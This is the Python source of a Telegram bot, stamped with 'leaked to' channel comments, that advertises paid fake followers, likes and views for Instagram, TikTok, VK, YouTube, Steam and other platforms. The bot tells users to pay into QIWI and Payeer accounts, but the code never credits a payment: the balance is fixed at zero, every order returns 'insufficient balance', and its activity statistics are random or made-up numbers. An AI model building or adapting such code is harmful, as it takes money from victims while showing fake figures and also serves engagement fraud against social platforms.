# Слито в https://t.me/HACKER_PHONE_VIP

import telebot
import random
from telebot import types
from keyboard import glawnaya, nakrutka, profl, popol, popol22, opl, instn, instnpdp, instnlike, instnvid, tgglaw, tgpdpd, nggrpdpd, tgview, vkglaw, vkpdp, vklike, vlview, ttglaw, ttpdp, ttlike, ttview, ytglaw, ytview, ytlike, ytpdpd, stimglaw, stimpdp, stimotzv, fbglaw, fbpdpgr, fblike, fbpros, okglaw, okpdp, oklike, okview, yadview, yadlike, yadpdp, yadglaw
from config import Admin, token, qiwi, payeer

# Слито в https://t.me/HACKER_PHONE_VIP

bot = telebot.TeleBot(token)

# Слито в https://t.me/HACKER_PHONE_VIP

############# СТАРТ #############
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_sticker(message.chat.id, 'CAACAgIAAxkBAAEDmeth0hNgsCQ4BgJkuMclJym77djfyQACAQEAAladvQoivp8OuMLmNCME')
    bot.send_message(message.chat.id, '''<b>👋🏻 Приветствую!

🌴 Ты находишься в лучшем боте для накрутки!</b>''', reply_markup=glawnaya(), parse_mode='html')
#################################

# Слито в https://t.me/HACKER_PHONE_VIP

######### МЕНЮ + ПРОФИЛЬ ########
@bot.message_handler(content_types=['text'])
def handler(message):
    if message.text == "⚡️ Накрутка":
        bot.send_message(message.chat.id, '<b>🔻 Выбери, на какой сервис тебе нужна накрутка!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "🍩 Личный кабинет":
        bot.send_message(message.chat.id, '<b>💈 Вы в личном кабинете!</b>', reply_markup=profl(), parse_mode='html')
    if message.text == "☘️ Администрация":
        markup = types.InlineKeyboardMarkup()
        button1 = types.InlineKeyboardButton('☘️ Связь с админом', url=(Admin))
        markup.add(button1)
        bot.send_message(message.chat.id, "<b>🔰 Если желаете приобрести рассылку в нашем боте, то обратитесь к Администрации!</b>", reply_markup=markup, parse_mode='html')
    if message.text == "💜 Моя статистика":
        bot.send_message(message.chat.id, '''<b>
💜Ваше статистика💜

➖➖➖➖➖➖➖
💷 Всего пополнений:</b> <code>0,00 ₽</code>
➖➖➖➖➖➖➖
<b>⚡️ Заказано накрутки:</b> <code>0 раз</code>
➖➖➖➖➖➖➖
💲 <b>Ваш баланс на тикущий момент состовляет:</b> <code>0,00 ₽</code>
➖➖➖➖➖➖➖''', reply_markup=popol(), parse_mode='html')

# Слито в https://t.me/HACKER_PHONE_VIP

    if message.text == "🌐 Общая статистика":
        bot.send_message(message.chat.id, '''<b>
🌐Общая статистика🌐

➖➖➖➖➖➖➖
💷 Всего пополнений:</b> <code>28,795 ₽</code>
➖➖➖➖➖➖➖
<b>⚡️ Заказано накрутки:</b> <code>12,563 раз</code>
➖➖➖➖➖➖➖
<b>🦋 Всего пользователей:</b> <code>5,328</code>
➖➖➖➖➖➖➖
🌸 <b>Бот запущен:</b> <code>16.09.2021</code>
➖➖➖➖➖➖➖''', parse_mode='html')

# Слито в https://t.me/HACKER_PHONE_VIP

    if message.text == "🦎 Статистика за сегодня":
        bot.send_message(message.chat.id, '''<b>
🦎Статистика за сегодня🦎

➖➖➖➖➖➖➖
💷 За сегодня пополнено:</b> <code>''' + str(random.randint(80, 500)) + ''' ₽</code>
➖➖➖➖➖➖➖
<b>⚡️ Заказано накрутки:</b> <code>''' + str(random.randint(2, 29)) + ''' раз</code>
➖➖➖➖➖➖➖
<b>🦋 Новых пользователей за сегодня:</b> <code>''' + str(random.randint(23, 112)) + '''</code>
➖➖➖➖➖➖➖''', parse_mode='html')

# Слито в https://t.me/HACKER_PHONE_VIP

    if message.text == "🥝 Киви":
        bot.send_message(message.chat.id, """➖➖➖➖➖➖➖➖➖
🥝<b>СПОСОБ ОПЛАТЫ ЧЕРЕЗ QIWI</b>🥝
➖➖➖➖➖➖➖➖➖

1️⃣ <b>Для оплаты переведите нужную сумму на этот ник:</b>
<code>""" + (qiwi) + """</code>

2️⃣ <b>В комментарии к платежу укажите:</b>
<code>""" + str(random.randint(1111111, 9999999)) + """</code>

3️⃣ <b>После оплаты нажмите на кнопку «💎 Я оплатил»!</b>""", reply_markup=opl(), parse_mode='html')

# Слито в https://t.me/HACKER_PHONE_VIP

    if message.text == "💶 PAYEER":
        bot.send_message(message.chat.id, """➖➖➖➖➖➖➖➖➖
🥝<b>СПОСОБ ОПЛАТЫ ЧЕРЕЗ PAYEER</b>🥝
➖➖➖➖➖➖➖➖➖

1️⃣ <b>Для оплаты переведите нужную сумму на эти реквизиты:</b>
<code>""" + (payeer) + """</code>

2️⃣ <b>В комментарии к платежу укажите:</b>
<code>""" + str(random.randint(111111, 999999)) + """</code>

3️⃣ <b>После оплаты нажмите на кнопку «💎 Я оплатил»!</b>""", reply_markup=opl(), parse_mode='html')

# Слито в https://t.me/HACKER_PHONE_VIP

    if message.text == "❌ Отмена":
        bot.send_message(message.chat.id, '<b>❌ Операция отменина!</b>', reply_markup=popol22(), parse_mode='html')
    if message.text == "💎 Я оплатил":
        bot.send_message(message.chat.id, """⏰<b>Ожидайте, ваш платеж находится в обработке или не найден!
➖➖➖➖➖➖
🎛Если вы оплатили, но пишет, что платеж не пришёл, то подождите 10-30 минут!</b>""", parse_mode='html')
##################################

# Слито в https://t.me/HACKER_PHONE_VIP

######## ЦЕНЫ НА НАКРУТКУ ########
    if message.text == "100 (7₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (65₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (600₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (5₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (15₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (100₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (10₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (35₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (300₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (22₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (200₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (1,800₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (10₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (27₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (250₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (13₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (100₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (800₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (15₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (75₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (700₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (10₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (95₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (900₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (66₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (600₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (5,800₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (14₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (130₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (1,200₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "10 (65₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "100 (600₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (5,800₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (92₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (890₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (68₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (650₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (6,000₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (38₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (350₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (3,250₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (20₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (180₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (1,500₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (12₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (80₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (750₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "10 000 (7,000₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "100 (16₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
    if message.text == "1 000 (140₽)":
        bot.send_message(message.chat.id, '<b>⚠️ Недостаточно денег на балансе!</b>', reply_markup=popol(), parse_mode='html')
##################################

# Слито в https://t.me/HACKER_PHONE_VIP

######## КНОПКИ СОЦ.СЕТЕЙ ########
    if message.text == "💲 Пополнить":
        bot.send_message(message.chat.id, '<b>💷 Выберете удобный способ пополнения!</b>', reply_markup=popol22(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Instagram":
        bot.send_message(message.chat.id, '<b>🔻 Выберите что будем накручивать!</b>', reply_markup=instn(), parse_mode='html')
    if message.text == "👥 Подписчики (Inst)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите подписчиков!</b>', reply_markup=instnpdp(), parse_mode='html')
    if message.text == "❤️ Лайки (Inst)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите лайков!</b>', reply_markup=instnlike(), parse_mode='html')
    if message.text == "💈 Просмотры (Inst)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите просмотров!</b>', reply_markup=instnvid(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Telegram":
        bot.send_message(message.chat.id, '<b>🔻 Выберите что будем накручивать!</b>', reply_markup=tgglaw(), parse_mode='html')
    if message.text == "👥 Подписчики канала (TG)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите подписчиков!</b>', reply_markup=tgpdpd(), parse_mode='html')
    if message.text == "🫂 Участники группы (TG)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите участников!</b>', reply_markup=nggrpdpd(), parse_mode='html')
    if message.text == "💈 Просмотры (TG)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите просмотров!</b>', reply_markup=tgview(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "VK":
        bot.send_message(message.chat.id, '<b>🔻 Выберите что будем накручивать!</b>', reply_markup=vkglaw(), parse_mode='html')
    if message.text == "👥 Подписчики (VK)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите подписчиков!</b>', reply_markup=vkpdp(), parse_mode='html')
    if message.text == "❤️ Лайки (VK)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите лайков!</b>', reply_markup=vklike(), parse_mode='html')
    if message.text == "💈 Просмотры (VK)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите просмотров!</b>', reply_markup=vlview(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "TikTok":
        bot.send_message(message.chat.id, '<b>🔻 Выберите что будем накручивать!</b>', reply_markup=ttglaw(), parse_mode='html')
    if message.text == "👥 Подписчики (TT)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите подписчиков!</b>', reply_markup=ttpdp(), parse_mode='html')
    if message.text == "❤️ Лайки (TT)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите лайков!</b>', reply_markup=ttlike(), parse_mode='html')
    if message.text == "💈 Просмотры (TT)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите просмотров!</b>', reply_markup=ttview(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "YouTube":
        bot.send_message(message.chat.id, '<b>🔻 Выберите что будем накручивать!</b>', reply_markup=ytglaw(), parse_mode='html')
    if message.text == "👥 Подписчики (YT)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите подписчиков!</b>', reply_markup=ytpdpd(), parse_mode='html')
    if message.text == "❤️ Лайки (YT)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите лайков!</b>', reply_markup=ytlike(), parse_mode='html')
    if message.text == "💈 Просмотры (YT)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите просмотров!</b>', reply_markup=ytview(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Steam":
        bot.send_message(message.chat.id, '<b>🔻 Выберите что будем накручивать!</b>', reply_markup=stimglaw(), parse_mode='html')
    if message.text == "👥 Подписчики (Steam)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите подписчиков!</b>', reply_markup=stimpdp(), parse_mode='html')
    if message.text == "📣 Отзывы (Steam)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите лайков!</b>', reply_markup=stimotzv(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Facebook":
        bot.send_message(message.chat.id, '<b>🔻 Выберите что будем накручивать!</b>', reply_markup=fbglaw(), parse_mode='html')
    if message.text == "👥 Участники группы (FB)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите подписчиков!</b>', reply_markup=fbpdpgr(), parse_mode='html')
    if message.text == "❤️ Лайки (FB)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите лайков!</b>', reply_markup=fblike(), parse_mode='html')
    if message.text == "💈 Просмотры (FB)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите просмотров!</b>', reply_markup=fbpros(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Одноклассники":
        bot.send_message(message.chat.id, '<b>🔻 Выберите что будем накручивать!</b>', reply_markup=okglaw(), parse_mode='html')
    if message.text == "👥 Подписчики (OK)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите подписчиков!</b>', reply_markup=okpdp(), parse_mode='html')
    if message.text == "❤️ Лайки (OK)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите лайков!</b>', reply_markup=oklike(), parse_mode='html')
    if message.text == "💈 Просмотры (OK)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите просмотров!</b>', reply_markup=okview(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Яндекс.Дзен":
        bot.send_message(message.chat.id, '<b>🔻 Выберите что будем накручивать!</b>', reply_markup=yadglaw(), parse_mode='html')
    if message.text == "👥 Подписчики (Я.Д)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите подписчиков!</b>', reply_markup=yadpdp(), parse_mode='html')
    if message.text == "❤️ Лайки (Я.Д)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите лайков!</b>', reply_markup=yadlike(), parse_mode='html')
    if message.text == "💈 Просмотры (Я.Д)":
        bot.send_message(message.chat.id, '<b>🔻 Выберите сколько хотите просмотров!</b>', reply_markup=yadview(), parse_mode='html')
##################################

# Слито в https://t.me/HACKER_PHONE_VIP

########## КНОПКИ НАЗАД ##########
    if message.text == "На главную ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись в главное меню!</b>', reply_markup=glawnaya(), parse_mode='html')
    if message.text == "Назад в профиль ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись в свой профиль!</b>', reply_markup=profl(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Назад (Inst) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "Назад к выбору (Inst) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=instn(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Назад (TG) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "Назад к выбору (TG) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=tgglaw(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Назад (VK) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "Назад к выбору (VK) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=vkglaw(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Назад (TT) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "Назад к выбору (TT) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=ttglaw(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Назад (YT) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "Назад к выбору (YT) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=ytglaw(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Назад (Steam) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "Назад к выбору (Steam) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=stimglaw(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Назад (FB) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "Назад к выбору (FB) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=fbglaw(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Назад (OK) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "Назад к выбору (OK) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=okglaw(), parse_mode='html')
# Слито в https://t.me/HACKER_PHONE_VIP
    if message.text == "Назад (Я.Д) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=nakrutka(), parse_mode='html')
    if message.text == "Назад к выбору (Я.Д) ↩️":
        bot.send_message(message.chat.id, '<b>⛩ Вы вернулись назад!</b>', reply_markup=yadglaw(), parse_mode='html')
##################################

# Слито в https://t.me/HACKER_PHONE_VIP

############# ИНЛАЙН #############
@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
   try:
       if call.message:
           if call.data == "good":
               bot.send_message(call.message.chat.id, '<b>💷 Выберете удобный способ пополнения!</b>', reply_markup=popol22(), parse_mode='html')
   except Exception as e:
       print(repr(e))
##################################

# Слито в https://t.me/HACKER_PHONE_VIP

bot.infinity_polling()
# Слито в https://t.me/HACKER_PHONE_VIP